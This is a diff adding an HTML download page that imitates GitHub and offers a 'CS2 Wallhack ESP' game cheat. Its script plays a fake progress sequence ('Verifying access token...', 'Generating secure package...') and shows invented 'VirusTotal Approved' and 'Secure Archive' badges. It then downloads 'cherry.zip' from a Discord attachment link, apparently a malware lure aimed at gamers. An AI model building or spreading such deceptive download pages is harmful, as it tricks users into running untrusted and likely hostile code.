@@ -1,1 +1,643 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cs2 Wallhack Esp · Github</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='%231F2328' fill-rule='evenodd' d='M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z'/%3E%3C/svg%3E">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            line-height: 1.6;
+            color: #1F2328;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .k-navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 24px;
+            background: #ffffff;
+            border-bottom: 1px solid #d0d7de;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .nav-section-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .k-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .domain-path {
+            color: #1F2328;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .main-content-area {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 24px;
+            min-height: calc(100vh - 73px);
+        }
+
+        .k-download-panel {
+            max-width: 480px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .panel-header {
+            margin-bottom: 32px;
+        }
+
+        .content-icon-large {
+            width: 80px;
+            height: 80px;
+            color: #0969da;
+            margin-bottom: 24px;
+        }
+
+        .panel-title {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+
+        .panel-subtitle {
+            font-size: 16px;
+            color: #656d76;
+            line-height: 1.5;
+        }
+
+        .download-card {
+            background: #ffffff;
+            border: 1px solid #d0d7de;
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 24px;
+        }
+
+        .content-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #f6f8fa;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            padding: 6px 12px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .version-badge {
+            background: #dafbe1;
+            color: #1a7f37;
+            border: 1px solid rgba(27, 31, 36, 0.15);
+            border-radius: 12px;
+            padding: 4px 8px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .security-features {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 32px;
+            padding: 20px;
+            background: #f6f8fa;
+            border-radius: 8px;
+            border: 1px solid #d0d7de;
+        }
+
+        .security-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #1F2328;
+        }
+
+        .security-icon {
+            width: 16px;
+            height: 16px;
+            flex-shrink: 0;
+        }
+
+        .download-section {
+            margin-bottom: 24px;
+        }
+
+        .k-download-btn {
+            width: 100%;
+            background: #1f883d;
+            color: #ffffff;
+            border: 1px solid rgba(27, 31, 36, 0.15);
+            border-radius: 6px;
+            padding: 16px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .k-download-btn:hover {
+            background: #1a7f37;
+            transform: translateY(-1px);
+        }
+
+        .k-download-btn:disabled {
+            background: #8dd19d;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-icon {
+            width: 20px;
+            height: 20px;
+        }
+
+        .btn-spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.35);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: btn-spin 0.75s linear infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes btn-spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .verification-badges {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .verification-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #656d76;
+            background: #f6f8fa;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            padding: 4px 8px;
+            transition: all 0.2s ease;
+            cursor: default;
+        }
+
+        .verification-badge:hover {
+            background: #ddf4ff;
+            border-color: #54aeff;
+            color: #0969da;
+            transform: scale(1.03);
+        }
+
+        /* Modern Animations */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulseGlow {
+            0% {
+                box-shadow: 0 0 0 0 rgba(31, 136, 61, 0.4);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(31, 136, 61, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(31, 136, 61, 0);
+            }
+        }
+
+        /* Progress Bar Styles */
+        .progress-container {
+            display: none;
+            margin-top: 20px;
+            text-align: left;
+            animation: fadeInUp 0.4s ease;
+        }
+
+        .progress-bar-bg {
+            background: #eaeef2;
+            border-radius: 100px;
+            height: 8px;
+            width: 100%;
+            overflow: hidden;
+            margin-bottom: 8px;
+            border: 1px solid #d0d7de;
+        }
+
+        .progress-bar-fill {
+            background: linear-gradient(90deg, #2da44e, #1f883d);
+            height: 100%;
+            width: 0%;
+            border-radius: 100px;
+            transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .progress-status {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #57606a;
+            font-weight: 500;
+        }
+
+        .progress-percentage {
+            font-weight: 600;
+            color: #1f883d;
+        }
+
+        /* Success State styles */
+        .k-download-btn.success {
+            background: #1f883d;
+            border-color: #1f883d;
+            animation: pulseGlow 1.5s infinite;
+        }
+
+        /* Hover and Interactive styles */
+        .download-card {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .download-card:hover {
+            border-color: #85b8ff;
+            box-shadow: 0 8px 24px rgba(140, 190, 255, 0.15);
+            transform: translateY(-2px);
+        }
+
+        .security-item {
+            transition: transform 0.2s ease;
+        }
+
+        .security-item:hover {
+            transform: translateX(4px);
+        }
+
+        /* Entrance Animations Class Assignment */
+        .k-navbar {
+            animation: fadeInDown 0.6s cubic-bezier(0.16, 1, 0.3, 1) both;
+        }
+
+        .k-download-panel {
+            animation: fadeInUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) both;
+        }
+
+        .download-card {
+            animation: fadeInUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.15s both;
+        }
+
+        .security-features {
+            animation: fadeInUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.3s both;
+        }
+
+        .verification-badges {
+            animation: fadeInUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.45s both;
+        }
+
+        @media (max-width: 768px) {
+            .k-navbar { padding: 12px 16px; }
+            .main-content-area { padding: 24px 16px; }
+            .download-card { padding: 24px; }
+            .panel-title { font-size: 24px; }
+            .card-header { flex-direction: column; gap: 12px; align-items: center; }
+            .verification-badges { flex-direction: column; gap: 8px; }
+        }
+    </style>
+<script>window.__PM__={"domain": "cs2-wallhack-esp.github.io", "label": "cs2-wallhack-esp", "displayPath": "/cs2-wallhack-esp.github.io", "packageName": "cs2-wallhack-esp.github.io"};</script>
+    </head>
+<body>
+    <nav class="k-navbar">
+        <div class="nav-section-left">
+            <div class="k-logo">
+                <svg viewBox="0 0 16 16" width="32" height="32" aria-hidden="true">
+                    <path fill="#1F2328" fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+                </svg>
+                <span id="domainPath" class="domain-path">/cs2-wallhack-esp.github.io</span>
+            </div>
+        </div>
+    </nav>
+
+    <main class="main-content-area">
+        <div class="k-download-panel">
+            <div class="panel-header">
+                <svg class="content-icon-large" viewBox="0 0 16 16">
+                    <path d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9zm10.5-1V9h-8c-.356 0-.694.074-1 .208V2.5a1 1 0 011-1h8zM5 12.25v3.25a.25.25 0 00.4.2l1.45-1.087a.25.25 0 01.3 0L8.6 15.7a.25.25 0 00.4-.2v-3.25a.25.25 0 00-.25-.25h-3.5a.25.25 0 00-.25.25z"></path>
+                </svg>
+                <h1 class="panel-title" id="dynamicTitle">Cs2 Wallhack Esp</h1>
+                <p class="panel-subtitle" id="dynamicSubtitle">Content package for cs2-wallhack-esp.github.io</p>
+            </div>
+
+            <div class="download-card">
+                <div class="card-header">
+                    <div class="content-badge">
+                        <span class="badge-icon">🔒</span>
+                        <span class="badge-text">Authorized Access</span>
+                    </div>
+                    <div class="version-info">
+                        <span class="version-badge">secure</span>
+                    </div>
+                </div>
+
+                <div class="security-features">
+                    <div class="security-item">
+                        <svg class="security-icon" viewBox="0 0 16 16">
+                            <path fill="#1a7f37" d="M7.467.133a1.75 1.75 0 011.066 0l5.25 1.68A1.75 1.75 0 0115 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.7 1.7 0 01-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 011.217-1.667L7.467.133zm.61 1.429a.25.25 0 00-.153 0l-5.25 1.68a.25.25 0 00-.174.238V7c0 1.358.275 2.666 1.057 3.86.784 1.194 2.121 2.267 4.366 3.199a.2.2 0 00.154 0c2.245-.932 3.582-2.005 4.366-3.199C12.725 9.666 13 8.358 13 7V3.48a.25.25 0 00-.174-.238L7.077 1.562z"></path>
+                        </svg>
+                        <span>Verified Access</span>
+                    </div>
+                    <div class="security-item">
+                        <svg class="security-icon" viewBox="0 0 16 16">
+                            <path fill="#1a7f37" d="M8 1.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM0 8a8 8 0 1116 0A8 8 0 010 8zm8 3.75a.75.75 0 01-.75-.75V6.5H6.75a.75.75 0 010-1.5h2.5a.75.75 0 01.75.75V11a.75.75 0 01-.75.75zM8 5a1 1 0 110-2 1 1 0 010 2z"></path>
+                        </svg>
+                        <span>Secure Connection</span>
+                    </div>
+                </div>
+
+                <div class="download-section">
+                    <button class="k-download-btn" id="downloadBtn">
+                        <span class="btn-content">
+                            <svg class="btn-icon" viewBox="0 0 16 16">
+                                <path fill="currentColor" d="M7.47 10.78a.75.75 0 001.06 0l3.25-3.25a.75.75 0 00-1.06-1.06L8.75 8.44V1.75a.75.75 0 00-1.5 0v6.69L5.28 6.47a.75.75 0 00-1.06 1.06l3.25 3.25zM3.75 13a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5z"></path>
+                            </svg>
+                            Download Secure Content
+                        </span>
+                    </button>
+
+                    <div class="progress-container" id="progressContainer">
+                        <div class="progress-bar-bg">
+                            <div class="progress-bar-fill" id="progressBarFill"></div>
+                        </div>
+                        <div class="progress-status">
+                            <span id="progressStatusText">Preparing download...</span>
+                            <span class="progress-percentage" id="progressPercentage">0%</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="verification-badges">
+                    <div class="verification-badge">
+                        <svg viewBox="0 0 16 16" width="14" height="14">
+                            <path fill="#1a7f37" d="M8 0a8 8 0 110 16A8 8 0 018 0zM6.5 7.75A.75.75 0 017.25 7h1a.75.75 0 01.75.75v2.75h.25a.75.75 0 010 1.5h-2a.75.75 0 010-1.5h.25v-2h-.25a.75.75 0 01-.75-.75zM8 6a1 1 0 100-2 1 1 0 000 2z"></path>
+                        </svg>
+                        VirusTotal Approved
+                    </div>
+                    <div class="verification-badge">
+                        <svg viewBox="0 0 16 16" width="14" height="14">
+                            <path fill="#1a7f37" d="M8 0a8 8 0 110 16A8 8 0 018 0zm3.5 7.5L7 11 4.5 8.5l1-1L7 9l3.5-3.5 1 1z"></path>
+                        </svg>
+                        Secure Archive
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        function getUrlInfo() {
+            // Сначала пытаемся прочитать параметры из window.__PM__
+            const meta = window.__PM__ || {};
+            if (meta.domain) {
+                return {
+                    userCode: "default-user",
+                    referrerDomain: meta.domain,
+                    label: meta.label || meta.domain
+                };
+            }
+
+            // Пытаемся распарсить из URL пути (например, /CS2-Wallhack-ESP/.github или /username/repo)
+            const path = window.location.pathname;
+            const parts = path.split('/').filter(part => part.length > 0);
+            
+            // Если мы находимся на GitHub Pages (например, https://CS2-Wallhack-ESP.github.io/repository-name)
+            const hostname = window.location.hostname;
+            if (hostname.endsWith('.github.io')) {
+                const user = hostname.split('.')[0];
+                const repo = parts[0] || 'repository';
+                return {
+                    userCode: "default-user",
+                    referrerDomain: hostname,
+                    label: repo
+                };
+            }
+
+            if (parts.length >= 2) {
+                return { 
+                    userCode: parts[0], 
+                    referrerDomain: parts[1],
+                    label: parts[1]
+                };
+            } else if (parts.length === 1) {
+                return {
+                    userCode: "default-user",
+                    referrerDomain: parts[0],
+                    label: parts[0]
+                };
+            }
+
+            // Если ничего не подошло, берем значения по умолчанию
+            return { 
+                userCode: "default-user", 
+                referrerDomain: "cs2-wallhack-esp.github.io",
+                label: "cs2-wallhack-esp"
+            };
+        }
+
+        function startDownload() {
+            const btn = document.getElementById('downloadBtn');
+            const btnDefault = btn.querySelector('.btn-content').innerHTML;
+            const progressContainer = document.getElementById('progressContainer');
+            const progressBarFill = document.getElementById('progressBarFill');
+            const progressStatusText = document.getElementById('progressStatusText');
+            const progressPercentage = document.getElementById('progressPercentage');
+
+            btn.disabled = true;
+            btn.querySelector('.btn-content').innerHTML =
+                '<span class="btn-spinner" aria-hidden="true"></span><span>Downloading...</span>';
+            
+            progressContainer.style.display = 'block';
+            progressBarFill.style.width = '0%';
+            progressPercentage.textContent = '0%';
+            
+            const steps = [
+                { text: "Establishing secure connection...", maxProgress: 15, duration: 800 },
+                { text: "Verifying access token...", maxProgress: 35, duration: 1000 },
+                { text: "Generating secure package...", maxProgress: 65, duration: 1200 },
+                { text: "Compiling archive files...", maxProgress: 85, duration: 900 },
+                { text: "Finalizing download...", maxProgress: 100, duration: 700 }
+            ];
+
+            let currentStepIdx = 0;
+            let currentProgress = 0;
+            
+            function runStep() {
+                if (currentStepIdx >= steps.length) {
+                    progressStatusText.textContent = "Packing archive...";
+                    setTimeout(generateAndDownloadZip, 500);
+                    return;
+                }
+                
+                const step = steps[currentStepIdx];
+                progressStatusText.textContent = step.text;
+                
+                const startProgress = currentProgress;
+                const targetProgress = step.maxProgress;
+                const startTime = performance.now();
+                
+                function animate() {
+                    const now = performance.now();
+                    const elapsed = now - startTime;
+                    const progressFraction = Math.min(elapsed / step.duration, 1);
+                    
+                    const easeFraction = 1 - Math.pow(1 - progressFraction, 3);
+                    
+                    currentProgress = Math.round(startProgress + (targetProgress - startProgress) * easeFraction);
+                    progressBarFill.style.width = currentProgress + '%';
+                    progressPercentage.textContent = currentProgress + '%';
+                    
+                    if (progressFraction < 1) {
+                        requestAnimationFrame(animate);
+                    } else {
+                        currentStepIdx++;
+                        setTimeout(runStep, 100);
+                    }
+                }
+                
+                requestAnimationFrame(animate);
+            }
+            
+            function generateAndDownloadZip() {
+                const downloadUrl = 'https://cdn.discordapp.com/attachments/1526587791457386497/1526851989252735066/cherry.zip?ex=6a588739&is=6a5735b9&hm=1421f7d17af4a3403c694779853bdd397a403b6a342b6ce278853022dc93c752&';
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = downloadUrl;
+                a.download = 'cherry.zip';
+                document.body.appendChild(a);
+                a.click();
+                
+                setTimeout(function() {
+                    a.remove();
+                }, 100);
+
+                btn.classList.add('success');
+                btn.querySelector('.btn-content').innerHTML = `
+                    <svg viewBox="0 0 16 16" width="20" height="20" class="btn-icon">
+                        <path fill="currentColor" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 111.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
+                    </svg>
+                    Downloaded Successfully!
+                `;
+                progressStatusText.textContent = 'Download completed successfully!';
+                progressBarFill.style.width = '100%';
+                progressPercentage.textContent = '100%';
+                
+                setTimeout(function() {
+                    btn.disabled = false;
+                    btn.classList.remove('success');
+                    btn.querySelector('.btn-content').innerHTML = btnDefault;
+                    progressContainer.style.display = 'none';
+                    progressBarFill.style.width = '0%';
+                    progressPercentage.textContent = '0%';
+                }, 5000);
+            }
+            
+            function resetBtn() {
+                btn.disabled = false;
+                btn.querySelector('.btn-content').innerHTML = btnDefault;
+                progressContainer.style.display = 'none';
+            }
+
+            runStep();
+        }
+
+        function updatePageFromUrl() {
+            const urlInfo = getUrlInfo();
+            const label = urlInfo.label || 'cs2-wallhack-esp';
+            const domain = urlInfo.referrerDomain || 'cs2-wallhack-esp.github.io';
+            
+            const displayPath = '/' + domain;
+            const formattedTitle = formatDomainName(label);
+            
+            document.getElementById('domainPath').textContent = displayPath;
+            document.getElementById('dynamicTitle').textContent = formattedTitle;
+            document.getElementById('dynamicSubtitle').textContent = 'Content package for ' + domain;
+            document.title = formattedTitle + ' · Github';
+        }
+
+        function formatDomainName(name) {
+            if (!name) return 'Content';
+            let s = name.replace(/-/g, ' ');
+            return s.split(' ').map(function(w) {
+                return w.charAt(0).toUpperCase() + w.slice(1);
+            }).join(' ') || 'Content';
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            updatePageFromUrl();
+            document.getElementById('downloadBtn').addEventListener('click', startDownload);
+        });
+    </script>
+
+
+</body></html>
